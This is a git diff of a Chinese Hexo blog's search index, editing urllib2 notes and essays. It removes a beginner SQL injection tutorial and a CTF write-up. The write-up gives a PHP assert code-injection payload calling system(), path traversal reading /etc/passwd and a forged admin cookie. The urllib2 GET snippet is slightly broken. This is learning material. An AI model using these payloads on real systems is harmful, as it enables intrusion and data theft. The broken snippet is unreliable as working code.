 <h3 id="3-发送GET请求"><a href="#3-发送GET请求" class="headerlink" title="3. 发送GET请求"></a>3. 发送GET请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">data = &#123;&#125;</div><div class="line"></div><div class="line">data[<span class="string">'name'</span>] = <span class="string">'WHY'</span></div><div class="line">data[<span class="string">'location'</span>] = <span class="string">'SDU'</span></div><div class="line">data[<span class="string">'language'</span>] = <span class="string">'Python'</span></div><div class="line"></div><div class="line">url_values = urllib.urlencode(data)</div><div class="line"><span class="keyword">print</span> url_values</div><div class="line"></div><div class="line">name=Somebody+Here&amp;language=Python&amp;location=Northampton</div><div class="line">url = <span class="string">'http://www.example.com/example.cgi'</span></div><div class="line">full_url = url + <span class="string">'?'</span> + url_values</div><div class="line">data = urllib2.open(full_url)</div></pre></td></tr></table></figure>
@@ -995,6 +963,10 @@
 <h3 id="10-Timeout-设置"><a href="#10-Timeout-设置" class="headerlink" title="10. Timeout 设置"></a>10. Timeout 设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># version &lt; 2.6</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> socket</div><div class="line">socket.setdefaulttimeout(<span class="number">10</span>)</div><div class="line">urllib2.socket.setdefaulttimeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"><span class="comment"># version &gt;= 2.6</span></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.google.com'</span>， timeout=<span class="number">10</span>)</div></pre></td></tr></table></figure>
 <h3 id="11-在-HTTP-Requset-中增加指定的-Header"><a href="#11-在-HTTP-Requset-中增加指定的-Header" class="headerlink" title="11. 在 HTTP Requset 中增加指定的 Header"></a>11. 在 HTTP Requset 中增加指定的 Header</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">request = urllib2.Request(<span class="string">'http://www.baidu.com/'</span>)</div><div class="line">request.add_header(<span class="string">'User-Agent'</span>, <span class="string">'fake-client'</span>)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div></pre></td></tr></table></figure>
 <h3 id="12-打开-Debug-log"><a href="#12-打开-Debug-log" class="headerlink" title="12. 打开 Debug log"></a>12. 打开 Debug log</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">httpHandler = urllib2.HTTPHandler(debuglevel=<span class="number">1</span>)</div><div class="line">httpsHandler = urllib2.HTTPSHandler(debuglevel=<span class="number">1</span>)</div><div class="line">opener = urllib2.build_opener(httpHandler, httpsHandler)</div><div class="line">urllib2.install_opener(opener)</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.google.com'</span>)</div></pre></td></tr></table></figure>
+<p>参考文章</p>
+<blockquote>
+<p><a href="https://lightless.me/archives/38.html" target="_blank" rel="external">Lightless - Python urllib2</a>   </p>
+</blockquote>
 ]]></content>
       
         <categories>
@@ -1139,108 +1111,6 @@
     </entry>
     
     <entry>
-      <title><![CDATA[从零开始的SQL注入（二）]]></title>
-      <url>/2017/07/26/sqli-2/</url>
-      <content type="html"><![CDATA[<p>第三期咕咕咕预告。</p>
-<a id="more"></a>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>记录一些基本的注入思路以及常见的注入类型。</p>
-<h2 id="0x01-什么是SQL注入呢？"><a href="#0x01-什么是SQL注入呢？" class="headerlink" title="0x01 什么是SQL注入呢？"></a>0x01 什么是SQL注入呢？</h2><p>我们看看百度是怎么讲的：  </p>
-<blockquote>
-<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
-</blockquote>
-<p>再来看看google是怎么说的：  </p>
-<blockquote>
-<p>SQL攻击（英语：SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p>
-</blockquote>
-<p>当然只看这些并不能很好地理解“何为SQL注入”这个问题。觉得涛涛的例子不错，就照着那个再来理解一次吧ouo。比如说我们写了一个简单的博客，每篇文章都有对应的序号以便读者查询，读者说想看第一篇文章，于是服务器就从数据库里拿出第一篇文章的数据返回给浏览器，浏览器把图片，文字显示给读者。这个过程用代码来表示大概是这个样子：  </p>
-<p>Acaleph访问了：<a href="https://cyris.cn/show.php?id=1" target="_blank" rel="external">https://cyris.cn/show.php?id=1</a> （数字表示第几篇文章。）<br>此时服务器的处理语句可能是这个样子：<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$id = $_GET[<span class="string">'id'</span>]<span class="comment">;  </span></div><div class="line"><span class="keyword">SELECT</span> * FROM articles WHERE articles_id = <span class="number">1</span></div></pre></td></tr></table></figure></p>
-<p>看起来似乎没什么问题呢，但是Acaleph比较调皮，她说：“我要看第二篇文章，然后把你的数据都删掉XD！”<br>于是语句变成了：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$id = $<span class="variable">_GET</span>[<span class="string">'id'</span>];  </div><div class="line"><span class="built_in">SELECT</span> * <span class="keyword">FROM</span> articles WHERE articles_id = <span class="number">2</span> <span class="built_in">and</span> <span class="built_in">drop</span> db_articles</div></pre></td></tr></table></figure></p>
-<p>聪明的永远是人而不是程序，这里程序直接把<code>id =2 and drop db_articles</code>当作一条命令去执行了，而非一条查询语句，那么我们的数据库就被次了，Acaleph成功删库跑路。    </p>
-<p>上面的例子只是一个初步的认识，想了解更多就自行Google啦。    </p>
-<h2 id="0x03-注入思路"><a href="#0x03-注入思路" class="headerlink" title="0x03 注入思路"></a>0x03 注入思路</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">查询字段数（<span class="keyword">order</span> <span class="title">by</span>）</div><div class="line">找出注入点</div><div class="line">获取数据库名（database()）</div><div class="line">获取表名</div><div class="line">获取字段名</div><div class="line">获取具体数据</div></pre></td></tr></table></figure>
-<p>下面说一下<del>其实也不是很</del>具体的做法吧：</p>
-<h4 id="1-查询字段数"><a href="#1-查询字段数" class="headerlink" title="1. 查询字段数"></a>1. 查询字段数</h4><p>主要是利用<code>order by</code>语句来查询。    </p>
-<blockquote>
-<p>ORDER BY 语句用于根据指定的列对结果集进行排序<br>ORDER BY 语句默认按照升序对记录进行排序    </p>
-</blockquote>
-<p>还是用上面的那个例子，我们可以在<code>?id = 1</code>后面跟上<code>order by 1</code>（1可以是其他的数字），假如在尝试某个数字的时候出现了报错（或者是之前都能看到一些数据，到某个数字后不再显示了），就可以确定字段数啦。  </p>
-<h4 id="2-找出注入点"><a href="#2-找出注入点" class="headerlink" title="2. 找出注入点"></a>2. 找出注入点</h4><p>在拿到字段数后就可以利用union语句来找出注入点了（可能会存在过滤），当然也有其他方法，在实例中讲吧。</p>
-<h4 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3. 获取数据库名"></a>3. 获取数据库名</h4><p>sql语句中的database()函数可以显示当前数据库名，用法和上一步差不多，不过是把第二步中找到的注入点的位置的数字改为database()传入。比如说，上一步中使用的语句是<code>union select 1, 2, 3, 4</code>，爆出来的字段位置是2，那这一步的语句就是<code>union select 1, database(), 3, 4</code>。   </p>
-<h4 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4. 获取表名"></a>4. 获取表名</h4><p>这里讲一下<code>information_schema</code>这张表，它里面保存了MySQL服务器所有数据库信息，比如数据库名，数据库的表，表格里的数据类型与访问权限等。我们用得比较多的就是<code>TABLES</code>（表信息）和<code>COLUMNS</code>（列信息）了。而<code>group_concat()</code>这个函数可以将结果合并，操作原理可以搜一搜，相关文章挺多的。我们主要用这个函数来获取表名。  </p>
-<blockquote>
-<p>MySQL官方文档：<a href="https://dev.mysql.com/doc/refman/5.7/en/information-schema.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.7/en/information-schema.html</a>   </p>
-</blockquote>
-<h4 id="5-获取字段名"><a href="#5-获取字段名" class="headerlink" title="5. 获取字段名"></a>5. 获取字段名</h4><p>还是通过<code>group_concat()</code>函数，利用<code>COLUMNS</code>表来获取字段名。   </p>
-<h4 id="6-获取具体数据"><a href="#6-获取具体数据" class="headerlink" title="6. 获取具体数据"></a>6. 获取具体数据</h4><p>表名和字段名都get到了，下面的操作就比较简单了。还是用上面的例子吧，比如一系列试探后我们得到了表名<code>ctf</code>和字段名<code>flag</code>，就可以构造语句<code>union select 1, (select flag from ctf), 3, 4</code>来获取具体的数据了。   </p>
-<p>当然以上都是一些比较基础的操作，实战过程中难免会遇到很多的防御措施，这时候就需要一些技巧来绕过了。</p>
-<h3 id="名为技巧的小家伙们"><a href="#名为技巧的小家伙们" class="headerlink" title="名为技巧的小家伙们"></a>名为技巧的小家伙们</h3><p>记录一些有趣的绕过方式。  </p>
-<blockquote>
-<p><a href="https://lorexxar.cn/2015/10/24/sqli_h/" target="_blank" rel="external">LoRexxar-关于sqli注入的特殊函数</a><br><a href="https://lorexxar.cn/2015/11/19/sql-error/" target="_blank" rel="external">LoRexxar-SQL显错注入</a><br><a href="https://lightless.me/archives/SQL-Injection-weisuo-Skill.html" target="_blank" rel="external">lightless-SQL Injection 的猥琐技巧</a></p>
-</blockquote>
-<h2 id="0x04-SQL注入类型"><a href="#0x04-SQL注入类型" class="headerlink" title="0x04 SQL注入类型"></a>0x04 SQL注入类型</h2><p>一些常见的SQL注入类型。<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">字符型（最典型的就是单引号'了，当然单引号不是万能的，常常需要结合一些经验与技巧来判断。）</div><div class="line">数字型（<span class="number">1</span>+<span class="number">1</span>会被处理成<span class="number">2</span>，在尝试时需要注意'+'要用'%<span class="number">2</span>b'代替）</div><div class="line">Boolean-based blind SQL <span class="built_in">injection</span>（布尔型注入）</div><div class="line">Error-based SQL <span class="built_in">injection</span>（报错型注入）</div><div class="line">UNION query SQL <span class="built_in">injection</span>（可联合查询注入）</div><div class="line">Stacked queries SQL <span class="built_in">injection</span>（可多语句查询注入）</div><div class="line"><span class="keyword">Time</span>-based blind SQL <span class="built_in">injection</span>（基于时间延迟注入）</div></pre></td></tr></table></figure></p>
-<p>各种注入类型会在接下来的实例中仔细地讲一下。</p>
-<p>参考文章：    </p>
-<blockquote>
-<p><a href="https://lightless.me/archives/zero-to-n-sqli-1.html" target="_blank" rel="external">lightless的从零开始SQL注入系列</a><br><a href="http://123.206.203.108/index.php/archives/18/" target="_blank" rel="external">一叶知秋的几篇关于SQL注入的文章</a></p>
-</blockquote>
-]]></content>
-      
-        <categories>
-            
-            <category> SQL </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> SQLi </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[从零开始的SQL注入（一）]]></title>
-      <url>/2017/07/18/sqli-labs/</url>
-      <content type="html"><![CDATA[<p>开了个新坑。</p>
-<a id="more"></a>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在看了涛涛的<a href="https://lightless.me/archives/zero-to-n-sqli-1.html" target="_blank" rel="external">从零开始SQL注入</a>后萌生了自己写一个系列的想法。 </p>
-<h2 id="0x01-搭建服务器环境"><a href="#0x01-搭建服务器环境" class="headerlink" title="0x01 搭建服务器环境"></a>0x01 搭建服务器环境</h2><ol>
-<li>下载<a href="https://www.apachefriends.org/download.html" target="_blank" rel="external">xampp包</a>。(易于安装，集成了Apache+MySQL+PHP+PERL，更容易使用。)  </li>
-<li>安装完成后启动Apache和MySQL（启动报错可能是因为80/443端口占用，在/xampp/apache/conf/extra/httpd-ssl.conf修改下Listen就可以了。）         </li>
-<li>启动完成后查看：<a href="http://localhost:442/xampp/" target="_blank" rel="external">http://localhost:442/xampp/</a>，页面正常则说明安装成功。（442改成自己设置的端口）</li>
-</ol>
-<h2 id="0x02-SQLi-Labs配置"><a href="#0x02-SQLi-Labs配置" class="headerlink" title="0x02 SQLi-Labs配置"></a>0x02 SQLi-Labs配置</h2><ol>
-<li>下载实验环境：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">SQLi-Labs</a>。</li>
-<li>把源码包解压到\xampp\htdocs下，重命名为sqli-labs。</li>
-<li>打开<a href="http://localhost:442/sqli-labs/" target="_blank" rel="external">http://localhost:442/sqli-labs/</a>，点下Setup/reset Database for labs建立数据库。（也可作恢复数据库用。）</li>
-<li>来，回到之前的页面，选一个题试试：<a href="http://localhost:442/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://localhost:442/sqli-labs/Less-1/?id=1</a></li>
-</ol>
-<p><img src="/2017/07/18/sqli-labs/1.png" alt=""></p>
-<p>注：如果xampp下载的是PHP 7+的版本，可能会存在数据库连接的问题，网上有相应的解决方案，视情况自行解决吧XD。</p>
-]]></content>
-      
-        <categories>
-            
-            <category> SQL </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> SQLi </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[觉得理性的人快乐嘛]]></title>
       <url>/2017/07/12/the-seed/</url>
       <content type="html"><![CDATA[<p>只是你不知道我的狂野。</p>
@@ -1289,7 +1159,7 @@
     </entry>
     
     <entry>
-      <title><![CDATA[hexo博客图片问题解决办法]]></title>
+      <title><![CDATA[Hexo 博客图片问题解决办法]]></title>
       <url>/2017/07/12/blog-picture-issue/</url>
       <content type="html"><![CDATA[<p>关于hexo博客图片无法正常显示的问题的解决办法。   </p>
 <a id="more"></a>
@@ -1329,74 +1199,6 @@
     </entry>
     
     <entry>
-      <title><![CDATA[OpenCTF WriteUp]]></title>
-      <url>/2017/07/03/OpenCTF/</url>
-      <content type="html"><![CDATA[<p>软件嘉年华部分题的题解。</p>
-<a id="more"></a>
-<p><a href="http://hdopen.xctf.org.cn/" target="_blank" rel="external">http://hdopen.xctf.org.cn/</a></p>
-<h1 id="一、WEB"><a href="#一、WEB" class="headerlink" title="一、WEB"></a>一、WEB</h1><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>URL: <a href="http://202.112.51.184:8001" target="_blank" rel="external">http://202.112.51.184:8001</a></p>
-<p>参考链接： <a href="https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md</a>    </p>
-<p>在about页面看到：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I used:   </div><div class="line">  -<span class="ruby"> Git   </span></div><div class="line">  -<span class="ruby"> PHP   </span></div><div class="line">  -<span class="ruby"> Bootstrap</span></div></pre></td></tr></table></figure></p>
-<p>先从/.git里拖个源码，这里用的<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a>：   </p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack<span class="selector-class">.py</span> http:<span class="comment">//202.112.51.184:8001/.git/</span></div></pre></td></tr></table></figure>
-<p>flag.php里的：     </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TODO</span></div><div class="line"><span class="comment">// $FLAG = '';</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>index.php里的关键代码：      </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require_once</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>比较菜只能做到这里。之后一叶知秋利用<a href="http://123.206.203.108/index.php/archives/15/" target="_blank" rel="external">assert函数引起的代码注射</a>构造payload：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?page='.system(<span class="string">"cd /var/www/html/;git diff;"</span>).<span class="symbol">'about</span></div></pre></td></tr></table></figure></p>
-<p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">diff --git a/templates/flag.php b/templates/flag.php</div><div class="line">index f8c9436.<span class="number">.1</span>d552ec <span class="number">100644</span></div><div class="line">--- a/templates/flag.php</div><div class="line">+++ b/templates/flag.php</div><div class="line">@@ <span class="number">-1</span>,<span class="number">4</span> +<span class="number">1</span> @@</div><div class="line">-<span class="meta">&lt;?php</span></div><div class="line">-<span class="comment">// TODO</span></div><div class="line">-<span class="comment">// $FLAG = '';</span></div><div class="line">-<span class="meta">?&gt;</span></div><div class="line">+<span class="meta">&lt;?php</span> $FLAG=<span class="string">"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;"</span>; <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<ul>
-<li>关于payload里的”/var/www/html/“，可以看看<a href="https://stackoverflow.com/questions/16197663/what-is-var-www-html" target="_blank" rel="external">https://stackoverflow.com/questions/16197663/what-is-var-www-html</a></li>
-</ul>
-<h2 id="web150-400"><a href="#web150-400" class="headerlink" title="web150, 400"></a>web150, 400</h2><p>URL: <a href="http://202.112.51.184:8002/" target="_blank" rel="external">http://202.112.51.184:8002/</a>    </p>
-<p>参考链接：     </p>
-<ol>
-<li><a href="https://thegoonies.rocks/csaw-2016-wtf-sh-web/" target="_blank" rel="external">https://thegoonies.rocks/csaw-2016-wtf-sh-web/</a>            </li>
-<li><a href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh" target="_blank" rel="external">https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh</a>     </li>
-</ol>
-<p>web150和web400这两题在上面的链接里都有详细的解答过程，这里稍微记录一下。</p>
-<p>题目里有个登陆页面，想到passwd文件存放在/etc目录下，尝试构造     </p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">202.112</span>.<span class="number">51.184</span>:<span class="number">8002</span><span class="regexp">/profile.wtf?user=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</div></pre></td></tr></table></figure>
-<p>得到响应：   </p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash<span class="string">'s posts:</span></span></div></pre></td></tr></table></figure>
-<p>再尝试读取   </p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/post.wtf?post=../users/</span></div></pre></td></tr></table></figure>
-<p>拉下来的列表里有一条包含admin的hash值与id的信息：        </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-poster"</span>&gt;</span>Posted by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/profile.wtf?user=Cv3uk"</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-title"</span>&gt;</span>822ec9ffd8e2e720b59e75d5c9047d690747af3e<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-body"</span>&gt;</span>tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>进入admin相关页面<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/profile.wtf?user=Cv3uk</span></div></pre></td></tr></table></figure></p>
-<p>然后伪造下cookie：</p>
-<pre><code>1. USERNAME = admin
-2. __cfduid = 822ec9ffd8e2e720b59e75d5c9047d690747af3e
-3. TOKEN = tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==
-</code></pre><p>最后在页面底部拿到flag。   </p>
-<p><img src="/2017/07/03/OpenCTF/1.png" alt="web150">  </p>
-<p>400分的题水平不够没写出来，看看上面的wp吧。</p>
-<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>URL: <a href="http://202.112.51.184:8000/cgi-bin/forms.pl" target="_blank" rel="external">http://202.112.51.184:8000/cgi-bin/forms.pl</a><br>原题： <a href="https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id" target="_blank" rel="external">https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id</a>   </p>
-<p>没太看懂解法，还在问土土师傅，之后补充。</p>
-<h1 id="二、Crypto"><a href="#二、Crypto" class="headerlink" title="二、Crypto"></a>二、Crypto</h1><h2 id="crypto-100"><a href="#crypto-100" class="headerlink" title="crypto 100"></a>crypto 100</h2><p>小明今天去妹纸家开Party,而妹纸却给他出了一个谜语,说只要他能答出来,她就会答应小明一个要求.  </p>
-<p>这是妹纸给小明的谜语序列:EW91X2FYZV9HX2DVB2RFYM95=    </p>
-<p>适当把大写字母改成小写然后base64解一下就可以了。  </p>
-<h2 id="crypto-150"><a href="#crypto-150" class="headerlink" title="crypto 150"></a>crypto 150</h2><p>URL: <a href="http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar" target="_blank" rel="external">http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar</a>     </p>
-<p>分享一份veritas501关于带密码压缩包题的思路整理：<br><a href="http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more" target="_blank" rel="external">http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more</a></p>
-<p>这题采用的是crc32碰撞法。  </p>
-]]></content>
-      
-        <categories>
-            
-            <category> CTF </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> CTF </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[菠萝牛肉饭]]></title>
       <url>/2017/07/02/tea-maker/</url>
       <content type="html"><![CDATA[<p>菠萝，青菜，牛肉，米饭，芝麻，番茄蛋汤。      </p>
@@ -1410,7 +1212,7 @@
 <h2 id="二、点亮宿舍的柠檬"><a href="#二、点亮宿舍的柠檬" class="headerlink" title="二、点亮宿舍的柠檬"></a>二、点亮宿舍的柠檬</h2><p>由随手翻倒的满杯的柠檬绿茶所释放的意象怪物。     </p>
 <p>某家店的饮品里常常会放入大只的果块果片，基本啃完了水果茶水也就剩下一点，放了冰块的东西得趁冷喝，热了化了淡了，这杯饮品迷人的地方就少了，那种有点先前的调味但是又掺杂着融化的人工冰块的塑料味的东西，不是很能接受，以后也不会。   </p>
 <p>急着开电脑打翻了杯刚买的柠檬茶，不开心，其实最近遇到了很多不顺心的事，知道要去调整，却惰于烦躁与抱怨。倒翻的绿茶很无意地点亮了这个地方，擦干地面的时候，有很舒服的味道充盈着这间屋子，降温消燥，忙着期末考好久未拖的地，也趁着这个机会干净了一把。    </p>
-<p><del>看似坏的东西也不一定全是坏事，也可能是以一小部分的坏抵消了一大部分的坏也说不准。</del> 看起来有点像毒鸡汤，于是上个删除线。不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎……</p>
+<p>不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎……</p>
 ]]></content>
       
         <categories>
@@ -1600,7 +1402,7 @@
     </entry>
     
     <entry>
-      <title><![CDATA[GIT时光机]]></title>
+      <title><![CDATA[GIT 时光机]]></title>
       <url>/2017/05/13/git/</url>
       <content type="html"><![CDATA[<p>Ak师傅的小灶上谈了些关于git的常见用法，回去以后做了些整理。</p>
 <a id="more"></a>
@@ -1703,7 +1505,7 @@
     </entry>
     
     <entry>
-      <title><![CDATA[Windows下利用Hexo+Coding搭建静态博客]]></title>
+      <title><![CDATA[Windows 下利用 Hexo + Coding 搭建静态博客]]></title>
       <url>/2017/04/05/hexo-blog/</url>
       <content type="html"><![CDATA[<p>一篇关于hexo博客搭建的小教程。   </p>
 <a id="more"></a>
@@ -1825,7 +1627,7 @@
     </entry>
     
     <entry>
-      <title><![CDATA[写在前面的]]></title>
+      <title><![CDATA[绿生]]></title>
       <url>/2017/04/04/acaleph/</url>
       <content type="html"><![CDATA[<p>干净，深刻，精致。<br>这是那一刻的绿生，所带给我的欣喜。</p>
 <a id="more"></a>
